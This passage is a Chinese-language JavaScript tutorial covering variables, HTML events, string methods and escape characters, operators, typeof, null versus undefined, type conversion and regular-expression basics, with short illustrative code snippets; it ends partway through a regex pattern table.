<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var var1 &#x3D; 1; &#x2F;&#x2F; 不可配置全局属性</span><br><span class="line">var2 &#x3D; 2; &#x2F;&#x2F; 没有使用 var 声明，可配置全局属性</span><br><span class="line"></span><br><span class="line">console.log(this.var1); &#x2F;&#x2F; 1</span><br><span class="line">console.log(window.var1); &#x2F;&#x2F; 1</span><br><span class="line">console.log(window.var2); &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">delete var1; &#x2F;&#x2F; false 无法删除</span><br><span class="line">console.log(var1); &#x2F;&#x2F;1</span><br><span class="line"></span><br><span class="line">delete var2; </span><br><span class="line">console.log(delete var2); &#x2F;&#x2F; true</span><br><span class="line">console.log(var2); &#x2F;&#x2F; 已经删除 报错变量未定义</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript作用域"><a href="#JavaScript作用域" class="headerlink" title="JavaScript作用域"></a>JavaScript作用域</h2><p>作用域是可访问变量的集合。</p>
<h3 id="HTML中的全局变量"><a href="#HTML中的全局变量" class="headerlink" title="HTML中的全局变量"></a>HTML中的全局变量</h3><p>在 HTML 中, 全局变量是 window 对象: 所有数据变量都属于 window 对象。</p>
<h2 id="JavaScript事件"><a href="#JavaScript事件" class="headerlink" title="JavaScript事件"></a>JavaScript事件</h2><p>HTML 事件是发生在 HTML 元素上的事情。</p>
<p>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p>
<h3 id="HTML事件"><a href="#HTML事件" class="headerlink" title="HTML事件"></a>HTML事件</h3><p>HTML 事件可以是浏览器行为，也可以是用户行为。</p>
<p>以下是 HTML 事件的实例：</p>
<p>HTML 页面完成加载</p>
<p>HTML input 字段改变时</p>
<p>HTML 按钮被点击</p>
<p>通常，当事件发生时，你可以做些事情。</p>
<p>在事件触发时 JavaScript 可以执行一些代码。</p>
<p>HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单引号:</span><br><span class="line">&lt;some-HTML-element some-event&#x3D;&#39;JavaScript 代码&#39;&gt;</span><br><span class="line">双引号:</span><br><span class="line">&lt;some-HTML-element some-event&#x3D;&quot;JavaScript 代码&quot;&gt;</span><br><span class="line">实例:</span><br><span class="line">&lt;button onclick&#x3D;&quot;getElementById(&#39;demo&#39;).innerHTML&#x3D;Date()&quot;&gt;现在的时间是?&lt;&#x2F;button&gt;</span><br><span class="line">&lt;button onclick&#x3D;&quot;this.innerHTML&#x3D;Date()&quot;&gt;现在的时间是?&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">JavaScript代码通常是几行代码。比较常见的是通过事件属性来调用:</span><br><span class="line">&lt;button onclick&#x3D;&quot;displayDate()&quot;&gt;现在的时间是?&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<h3 id="常见的HTML事件"><a href="#常见的HTML事件" class="headerlink" title="常见的HTML事件"></a>常见的HTML事件</h3><p>下面是一些常见的HTML事件的列表:</p>
<table>
<thead>
<tr>
<th align="left">事件</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">onchange</td>
<td align="left">HTML 元素改变</td>
</tr>
<tr>
<td align="left">onclick</td>
<td align="left">用户点击 HTML 元素</td>
</tr>
<tr>
<td align="left">onmouseover</td>
<td align="left">用户在一个HTML元素上移动鼠标</td>
</tr>
<tr>
<td align="left">onmouseout</td>
<td align="left">用户从一个HTML元素上移开鼠标</td>
</tr>
<tr>
<td align="left">onkeydown</td>
<td align="left">用户按下键盘按键</td>
</tr>
<tr>
<td align="left">onload</td>
<td align="left">浏览器已完成页面的加载</td>
</tr>
</tbody></table>
<h3 id="JavaScript可以做什么？"><a href="#JavaScript可以做什么？" class="headerlink" title="JavaScript可以做什么？"></a>JavaScript可以做什么？</h3><p>事件可以用于处理表单验证，用户输入，用户行为及浏览器动作:</p>
<p>页面加载时触发事件</p>
<p>页面关闭时触发事件</p>
<p>用户点击按钮执行动作</p>
<p>验证用户输入内容的合法性</p>
<p>等等 …</p>
<p>可以使用多种方法来执行 JavaScript 事件代码：</p>
<p>HTML 事件属性可以直接执行 JavaScript 代码</p>
<p>HTML 事件属性可以调用 JavaScript 函数</p>
<p>你可以为 HTML 元素指定自己的事件处理程序</p>
<p>你可以阻止事件的发生。</p>
<p>等等 …</p>
<h2 id="JavaScript字符串"><a href="#JavaScript字符串" class="headerlink" title="JavaScript字符串"></a>JavaScript字符串</h2><p>JavaScript 字符串用于存储和处理文本。</p>
<p>字符串可以存储一系列字符，如 “John Doe”。</p>
<p>字符串可以是插入到引号中的任何字符。你可以使用单引号或双引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var carname &#x3D; &quot;Volvo XC60&quot;;</span><br><span class="line">var carname &#x3D; &#39;Volvo XC60&#39;;</span><br></pre></td></tr></table></figure>

<p>可以使用索引位置来访问字符串中的每个字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var character &#x3D; carname[7];</span><br></pre></td></tr></table></figure>

<p>字符串的索引从 0 开始，这意味着第一个字符索引值为 [0],第二个为 [1], 以此类推。</p>
<p>可以在字符串中使用引号，字符串中的引号不要与字符串的引号相同:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var answer &#x3D; &quot;It&#39;s alright&quot;;</span><br><span class="line">var answer &#x3D; &quot;He is called &#39;Johnny&#39;&quot;;</span><br><span class="line">var answer &#x3D; &#39;He is called &quot;Johnny&quot;&#39;;</span><br></pre></td></tr></table></figure>

<p>也可以在字符串添加转义字符来使用引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; &#39;It\&#39;s alright&#39;;</span><br><span class="line">var y &#x3D; &quot;He is called \&quot;Johnny\&quot;&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><p>可以使用内置属性 <strong>length</strong> 来计算字符串的长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var txt &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">var sln &#x3D; txt.length;</span><br></pre></td></tr></table></figure>

<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>在 JavaScript 中，字符串写在单引号或双引号中。</p>
<p>因为这样，以下实例 JavaScript 无法解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;We are the so-called &quot;Vikings&quot; from the north.&quot;</span><br><span class="line">字符串 &quot;We are the so-called &quot; 被截断。</span><br></pre></td></tr></table></figure>

<p>如何解决以上的问题呢？可以使用反斜杠 () 来转义 “Vikings” 字符串中的双引号，如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;</span><br></pre></td></tr></table></figure>

<p> 反斜杠是一个<strong>转义字符</strong>。 转义字符将特殊字符转换为字符串字符：</p>
<p>转义字符 () 可以用于转义撇号，换行，引号，等其他特殊字符。</p>
<p>下表中列举了在字符串中可以使用转义字符转义的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">代码</th>
<th align="left">输出</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#39;</td>
<td align="left">单引号</td>
</tr>
<tr>
<td align="left">&quot;</td>
<td align="left">双引号</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">反斜杠</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">回车</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">tab(制表符)</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">退格符</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页符</td>
</tr>
</tbody></table>
<h3 id="字符串可以是对象"><a href="#字符串可以是对象" class="headerlink" title="字符串可以是对象"></a>字符串可以是对象</h3><p>通常， JavaScript 字符串是原始值，可以使用字符创建： <strong>var firstName = “John”</strong></p>
<p>但我们也可以使用 new 关键字将字符串定义为一个对象： <strong>var firstName = new String(“John”)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; &quot;John&quot;;</span><br><span class="line">var y &#x3D; new String(&quot;John&quot;);</span><br><span class="line">typeof x &#x2F;&#x2F; 返回 String</span><br><span class="line">typeof y &#x2F;&#x2F; 返回 Object</span><br><span class="line"></span><br><span class="line">不要创建 String 对象。它会拖慢执行速度，并可能产生其他副作用：</span><br><span class="line">var x &#x3D; &quot;John&quot;;             </span><br><span class="line">var y &#x3D; new String(&quot;John&quot;);</span><br><span class="line">(x &#x3D;&#x3D;&#x3D; y) &#x2F;&#x2F; 结果为 false，因为 x 是字符串，y 是对象</span><br><span class="line">&#x3D;&#x3D;&#x3D; 为绝对相等，即数据类型与值都必须相等。</span><br></pre></td></tr></table></figure>

<h3 id="字符串属性和方法"><a href="#字符串属性和方法" class="headerlink" title="字符串属性和方法"></a>字符串属性和方法</h3><p>原始值字符串，如 “John”, 没有属性和方法(因为他们不是对象)。</p>
<p>原始值可以使用 JavaScript 的属性和方法，因为 JavaScript 在执行方法和属性时可以把原始值当作对象。</p>
<h3 id="字符串属性"><a href="#字符串属性" class="headerlink" title="字符串属性"></a>字符串属性</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">constructor</td>
<td align="left">返回创建字符串属性的函数</td>
</tr>
<tr>
<td align="left">length</td>
<td align="left">返回字符串的长度</td>
</tr>
<tr>
<td align="left">prototype</td>
<td align="left">允许您向对象添加属性和方法</td>
</tr>
</tbody></table>
<h3 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h3><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">charAt()</td>
<td align="left">返回指定索引位置的字符</td>
</tr>
<tr>
<td align="left">charCodeAt()</td>
<td align="left">返回指定索引位置字符的 Unicode 值</td>
</tr>
<tr>
<td align="left">concat()</td>
<td align="left">连接两个或多个字符串，返回连接后的字符串</td>
</tr>
<tr>
<td align="left">fromCharCode()</td>
<td align="left">将 Unicode 转换为字符串</td>
</tr>
<tr>
<td align="left">indexOf()</td>
<td align="left">返回字符串中检索指定字符第一次出现的位置</td>
</tr>
<tr>
<td align="left">lastIndexOf()</td>
<td align="left">返回字符串中检索指定字符最后一次出现的位置</td>
</tr>
<tr>
<td align="left">localeCompare()</td>
<td align="left">用本地特定的顺序来比较两个字符串</td>
</tr>
<tr>
<td align="left">match()</td>
<td align="left">找到一个或多个正则表达式的匹配</td>
</tr>
<tr>
<td align="left">replace()</td>
<td align="left">替换与正则表达式匹配的子串</td>
</tr>
<tr>
<td align="left">search()</td>
<td align="left">检索与正则表达式相匹配的值</td>
</tr>
<tr>
<td align="left">slice()</td>
<td align="left">提取字符串的片断，并在新的字符串中返回被提取的部分</td>
</tr>
<tr>
<td align="left">split()</td>
<td align="left">把字符串分割为子字符串数组</td>
</tr>
<tr>
<td align="left">substr()</td>
<td align="left">从起始索引号提取字符串中指定数目的字符</td>
</tr>
<tr>
<td align="left">substring()</td>
<td align="left">提取字符串中两个指定的索引号之间的字符</td>
</tr>
<tr>
<td align="left">toLocaleLowerCase()</td>
<td align="left">根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td>
</tr>
<tr>
<td align="left">toLocaleUpperCase()</td>
<td align="left">根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td>
</tr>
<tr>
<td align="left">toLowerCase()</td>
<td align="left">把字符串转换为小写</td>
</tr>
<tr>
<td align="left">toString()</td>
<td align="left">返回字符串对象值</td>
</tr>
<tr>
<td align="left">toUpperCase()</td>
<td align="left">把字符串转换为大写</td>
</tr>
<tr>
<td align="left">trim()</td>
<td align="left">移除字符串首尾空白</td>
</tr>
<tr>
<td align="left">valueOf()</td>
<td align="left">返回某个字符串对象的原始值</td>
</tr>
</tbody></table>
<h2 id="JavaScript运算符"><a href="#JavaScript运算符" class="headerlink" title="JavaScript运算符"></a>JavaScript运算符</h2><p>算数运算符和逻辑运算符基本和C语言一样</p>
<h3 id="用于字符串的-运算符"><a href="#用于字符串的-运算符" class="headerlink" title="用于字符串的+运算符"></a>用于字符串的+运算符</h3><p>+ 运算符用于把文本值或字符串变量加起来（连接起来）。</p>
<p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">txt1&#x3D;&quot;What a very &quot;;</span><br><span class="line">txt2&#x3D;&quot;nice day&quot;;</span><br><span class="line">txt3&#x3D;txt1+txt2;  &#x2F;&#x2F;txt3&#x3D;&quot;What a very nice day&quot;</span><br></pre></td></tr></table></figure>

<h3 id="字符串和数字加法运算"><a href="#字符串和数字加法运算" class="headerlink" title="字符串和数字加法运算"></a>字符串和数字加法运算</h3><p>两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串，如下实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;5+5;</span><br><span class="line">y&#x3D;&quot;5&quot;+5;</span><br><span class="line">z&#x3D;&quot;Hello&quot;+5;</span><br><span class="line"></span><br><span class="line">x,y,z 输出结果为:</span><br><span class="line">10</span><br><span class="line">55</span><br><span class="line">Hello5</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript比较"><a href="#JavaScript比较" class="headerlink" title="JavaScript比较"></a>JavaScript比较</h2><p>比较和逻辑运算符用于测试 <em>true</em> 或者 <em>false</em>。</p>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>基本也和C语言相同，但是多了===(绝对等于)和!==(不绝对等于)。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">===</td>
<td align="left">绝对等于（值和类型均相等）</td>
</tr>
<tr>
<td align="left">!==</td>
<td align="left">不绝对等于（值和类型有一个不相等，或两个都不相等）</td>
</tr>
</tbody></table>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>同C语言</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;&amp;</td>
<td align="left">and</td>
<td align="left">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td>
</tr>
<tr>
<td align="left">||</td>
<td align="left">or</td>
<td align="left">(x==5 || y==5) 为 false</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">not</td>
<td align="left">!(x==y) 为 true</td>
</tr>
</tbody></table>
<h3 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h3><p>JavaScript 还包含了基于某些条件对变量进行赋值的条件运算符。</p>
<p>这个和C语言的三目运算符用法一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">variablename&#x3D;(condition)?value1:value2;</span><br><span class="line">例如:</span><br><span class="line">voteable&#x3D;(age&lt;18)?&quot;年龄太小&quot;:&quot;年龄已达到&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript条件语句"><a href="#JavaScript条件语句" class="headerlink" title="JavaScript条件语句"></a>JavaScript条件语句</h2><p>在 JavaScript 中，我们可使用以下条件语句：</p>
<p>if语句</p>
<p>if…else语句</p>
<p>if…else if…else语句</p>
<p>switch语句</p>
<p>用法同C语言</p>
<h2 id="JavaScript循环"><a href="#JavaScript循环" class="headerlink" title="JavaScript循环"></a>JavaScript循环</h2><p>JavaScript 支持不同类型的循环：</p>
<p>for - 循环代码块一定的次数</p>
<p>for/in - 循环遍历对象的属性</p>
<p>while - 当指定的条件为 true 时循环指定的代码块</p>
<p>do/while - 同样当指定的条件为 true 时循环指定的代码块</p>
<p>break 语句用于跳出循环。</p>
<p>continue 用于跳过循环中的一个迭代。</p>
<p>基本同C语言，多了个for/in循环。</p>
<p>JavaScript for/in 语句循环遍历对象的属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person&#x3D;&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;; </span><br><span class="line"> </span><br><span class="line">for (x in person)  &#x2F;&#x2F; x 为属性名</span><br><span class="line">&#123;</span><br><span class="line">    txt&#x3D;txt + person[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-typeof"><a href="#JavaScript-typeof" class="headerlink" title="JavaScript typeof"></a>JavaScript typeof</h2><h3 id="typeof操作符"><a href="#typeof操作符" class="headerlink" title="typeof操作符"></a>typeof操作符</h3><p>你可以使用 typeof 操作符来检测变量的数据类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof &quot;John&quot;                &#x2F;&#x2F; 返回 string</span><br><span class="line">typeof 3.14                  &#x2F;&#x2F; 返回 number</span><br><span class="line">typeof false                 &#x2F;&#x2F; 返回 boolean</span><br><span class="line">typeof [1,2,3,4]             &#x2F;&#x2F; 返回 object</span><br><span class="line">typeof &#123;name:&#39;John&#39;, age:34&#125; &#x2F;&#x2F; 返回 object</span><br><span class="line">在JavaScript中，数组是一种特殊的对象类型。 因此 typeof [1,2,3,4] 返回 object。</span><br></pre></td></tr></table></figure>

<h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>在 JavaScript 中 null 表示 “什么都没有”。</p>
<p>null是一个只有一个值的特殊类型。表示一个空对象引用。</p>
<p> 用 typeof 检测 null 返回是object。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以设置为 null 来清空对象:</span><br><span class="line">var person &#x3D; null;           &#x2F;&#x2F; 值为 null(空), 但类型为对象</span><br><span class="line">可以设置为 undefined 来清空对象:</span><br><span class="line">var person &#x3D; undefined;     &#x2F;&#x2F; 值为 undefined, 类型为 undefined</span><br></pre></td></tr></table></figure>

<h3 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h3><p>在 JavaScript 中, undefined 是一个没有设置值的变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof 一个没有值的变量会返回 undefined。</span><br><span class="line">var person;                  &#x2F;&#x2F; 值为 undefined(空), 类型是undefined</span><br><span class="line"></span><br><span class="line">任何变量都可以通过设置值为 undefined 来清空。 类型为 undefined.</span><br><span class="line">person &#x3D; undefined;          &#x2F;&#x2F; 值为 undefined, 类型是undefined</span><br></pre></td></tr></table></figure>

<h3 id="undefined和null的区别"><a href="#undefined和null的区别" class="headerlink" title="undefined和null的区别"></a>undefined和null的区别</h3><p>null 和 undefined 的值相等，但类型不等：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof undefined             &#x2F;&#x2F; undefined</span><br><span class="line">typeof null                  &#x2F;&#x2F; object</span><br><span class="line">null &#x3D;&#x3D;&#x3D; undefined           &#x2F;&#x2F; false</span><br><span class="line">null &#x3D;&#x3D; undefined            &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>1、定义</strong></p>
<p>（1）undefined：是所有没有赋值变量的默认值，自动赋值。</p>
<p>（2）null：主动释放一个变量引用的对象，表示一个变量不再指向任何对象地址。</p>
<p><strong>2、何时使用null?</strong></p>
<p>当使用完一个比较大的对象时，需要对其进行释放内存时，设置为 null。</p>
<p><strong>3、null 与 undefined 的异同点是什么呢？</strong></p>
<p><strong>共同点</strong>：都是原始类型，保存在栈中变量本地。</p>
<p>不同点：</p>
<p>（1）undefined——表示变量声明过但并未赋过值。</p>
<p>它是所有未赋值变量默认值，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;var a;    &#x2F;&#x2F; a 自动被赋值为 undefined</span><br></pre></td></tr></table></figure>

<p>（2）null——表示一个变量将来可能指向一个对象。</p>
<p>一般用于主动释放指向对象的引用，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;var emps &#x3D; [&#39;ss&#39;,&#39;nn&#39;];</span><br><span class="line">&gt;emps &#x3D; null;     &#x2F;&#x2F; 释放指向数组的引用</span><br></pre></td></tr></table></figure>

<p>4、延伸——垃圾回收站</p>
<p>它是专门释放对象内存的一个程序。</p>
<p>（1）在底层，后台伴随当前程序同时运行；引擎会定时自动调用垃圾回收期；</p>
<p>（2）总有一个对象不再被任何变量引用时，才释放。</p>
</blockquote>
<h2 id="JavaScript类型转换"><a href="#JavaScript类型转换" class="headerlink" title="JavaScript类型转换"></a>JavaScript类型转换</h2><p>Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值。</p>
<h3 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h3><p>在 JavaScript 中有 6 种不同的数据类型：</p>
<ul>
<li>string</li>
<li>number</li>
<li>boolean</li>
<li>object</li>
<li>function</li>
<li>symbol</li>
</ul>
<p>3 种对象类型：</p>
<ul>
<li>Object</li>
<li>Date</li>
<li>Array</li>
</ul>
<p>2 个不包含任何值的数据类型：</p>
<ul>
<li>null</li>
<li>undefined</li>
</ul>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>JavaScript 变量可以转换为新变量或其他数据类型：</p>
<p>通过使用 JavaScript 函数</p>
<p>通过 JavaScript 自身自动转换</p>
<h3 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符+"></a>一元运算符+</h3><p><strong>Operator +</strong> 可用于将变量转换为数字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var y &#x3D; &quot;5&quot;;      &#x2F;&#x2F; y 是一个字符串</span><br><span class="line">var x &#x3D; + y;      &#x2F;&#x2F; x 是一个数字</span><br></pre></td></tr></table></figure>

<p>如果变量不能转换，它仍然会是一个数字，但值为 NaN (不是一个数字):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var y &#x3D; &quot;John&quot;;   &#x2F;&#x2F; y 是一个字符串</span><br><span class="line">var x &#x3D; + y;      &#x2F;&#x2F; x 是一个数字 (NaN)</span><br></pre></td></tr></table></figure>

<h3 id="自动转换类型"><a href="#自动转换类型" class="headerlink" title="自动转换类型"></a>自动转换类型</h3><p>当 JavaScript 尝试操作一个 “错误” 的数据类型时，会自动转换为 “正确” 的数据类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5 + null    &#x2F;&#x2F; 返回 5         null 转换为 0</span><br><span class="line">&quot;5&quot; + null  &#x2F;&#x2F; 返回&quot;5null&quot;   null 转换为 &quot;null&quot;</span><br><span class="line">&quot;5&quot; + 1     &#x2F;&#x2F; 返回 &quot;51&quot;      1 转换为 &quot;1&quot; </span><br><span class="line">&quot;5&quot; - 1     &#x2F;&#x2F; 返回 4         &quot;5&quot; 转换为 5</span><br></pre></td></tr></table></figure>

<h3 id="自动转换为字符串"><a href="#自动转换为字符串" class="headerlink" title="自动转换为字符串"></a>自动转换为字符串</h3><p>当你尝试输出一个对象或一个变量时 JavaScript 会自动调用变量的 toString() 方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;demo&quot;).innerHTML &#x3D; myVar;</span><br><span class="line"></span><br><span class="line">myVar &#x3D; &#123;name:&quot;Fjohn&quot;&#125;  &#x2F;&#x2F; toString 转换为 &quot;[object Object]&quot;</span><br><span class="line">myVar &#x3D; [1,2,3,4]       &#x2F;&#x2F; toString 转换为 &quot;1,2,3,4&quot;</span><br><span class="line">myVar &#x3D; new Date()      &#x2F;&#x2F; toString 转换为 &quot;Fri Jul 18 2014 09:08:55 GMT+0200&quot;</span><br><span class="line">数字和布尔值也经常相互转换：</span><br><span class="line">myVar &#x3D; 123             &#x2F;&#x2F; toString 转换为 &quot;123&quot;</span><br><span class="line">myVar &#x3D; true            &#x2F;&#x2F; toString 转换为 &quot;true&quot;</span><br><span class="line">myVar &#x3D; false           &#x2F;&#x2F; toString 转换为 &quot;false&quot;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript正则表达式"><a href="#JavaScript正则表达式" class="headerlink" title="JavaScript正则表达式"></a>JavaScript正则表达式</h2><p>正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。</p>
<p>搜索模式可用于文本搜索和文本替换。</p>
<h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><p>正则表达式是由一个字符序列形成的搜索模式。</p>
<p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。</p>
<p>正则表达式可以是一个简单的字符，或一个更复杂的模式。</p>
<p>正则表达式可用于所有文本搜索和文本替换的操作。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>/正则表达式主体/修饰符(可选)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实例:</span><br><span class="line">var patt &#x3D; &#x2F;runoob&#x2F;i</span><br><span class="line"></span><br><span class="line">实例解析：</span><br><span class="line">&#x2F;runoob&#x2F;i  是一个正则表达式。</span><br><span class="line">runoob  是一个正则表达式主体 (用于检索)。</span><br><span class="line">i  是一个修饰符 (搜索不区分大小写)。</span><br></pre></td></tr></table></figure>

<h3 id="使用字符串方法"><a href="#使用字符串方法" class="headerlink" title="使用字符串方法"></a>使用字符串方法</h3><p>在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。</p>
<p><strong>search() 方法</strong> 用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</p>
<p><strong>replace() 方法</strong> 用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。</p>
<h3 id="search-方法使用正则表达式"><a href="#search-方法使用正则表达式" class="headerlink" title="search()方法使用正则表达式"></a>search()方法使用正则表达式</h3><p>使用正则表达式搜索 “Runoob” 字符串，且不区分大小写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; &quot;Visit Runoob!&quot;; </span><br><span class="line">var n &#x3D; str.search(&#x2F;Runoob&#x2F;i);   &#x2F;&#x2F;输出结果为:6</span><br></pre></td></tr></table></figure>

<h3 id="search-方法使用字符串"><a href="#search-方法使用字符串" class="headerlink" title="search()方法使用字符串"></a>search()方法使用字符串</h3><p>search 方法可使用字符串作为参数。字符串参数会转换为正则表达式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; &quot;Visit Runoob!&quot;; </span><br><span class="line">var n &#x3D; str.search(&quot;Runoob&quot;);  &#x2F;&#x2F;输出结果为:6</span><br></pre></td></tr></table></figure>

<h3 id="replace-方法使用正则表达式"><a href="#replace-方法使用正则表达式" class="headerlink" title="replace()方法使用正则表达式"></a>replace()方法使用正则表达式</h3><p>使用正则表达式且不区分大小写将字符串中的 Microsoft 替换为 Runoob :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; document.getElementById(&quot;demo&quot;).innerHTML; </span><br><span class="line">var txt &#x3D; str.replace(&#x2F;microsoft&#x2F;i,&quot;Runoob&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="replace-方法使用字符串"><a href="#replace-方法使用字符串" class="headerlink" title="replace()方法使用字符串"></a>replace()方法使用字符串</h3><p>replace() 方法将接收字符串作为参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; document.getElementById(&quot;demo&quot;).innerHTML; </span><br><span class="line">var txt &#x3D; str.replace(&quot;Microsoft&quot;,&quot;Runoob&quot;);</span><br></pre></td></tr></table></figure>

<p>正则表达式参数可用在以上方法中 (替代字符串参数)。<br>正则表达式使得搜索功能更加强大(如实例中不区分大小写)。</p>
<h3 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h3><table>
<thead>
<tr>
<th align="left">修饰符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td align="left">g</td>
<td align="left">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td align="left">m</td>
<td align="left">执行多行匹配。</td>
</tr>
</tbody></table>
<h3 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h3><p>方括号用于查找某个范围内的字符：</p>
<table>
<thead>
<tr>
<th align="left">表达式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[abc]</td>
<td align="left">查找方括号之间的任何字符。</td>
</tr>
<tr>
<td align="left">[^abc]</td>
<td align="left">查找任何不在方括号之间的字符。</td>
</tr>
<tr>
<td align="left">[0-9]</td>
<td align="left">查找任何从 0 至 9 的数字。</td>
</tr>
<tr>
<td align="left">[a-z]</td>
<td align="left">查找任何从小写 a 到小写 z 的字符。</td>
</tr>
<tr>
<td align="left">[A-Z]</td>
<td align="left">查找任何从大写 A 到大写 Z 的字符。</td>
</tr>
<tr>
<td align="left">[A-z]</td>
<td align="left">查找任何从大写 A 到小写 z 的字符。</td>
</tr>
<tr>
<td align="left">[adgk]</td>
<td align="left">查找给定集合内的任何字符。</td>
</tr>
<tr>
<td align="left">[^adgk]</td>
<td align="left">查找给定集合外的任何字符。</td>
</tr>
<tr>
<td align="left">(red|blue|green)</td>
<td align="left">查找任何指定的选项。</td>
</tr>
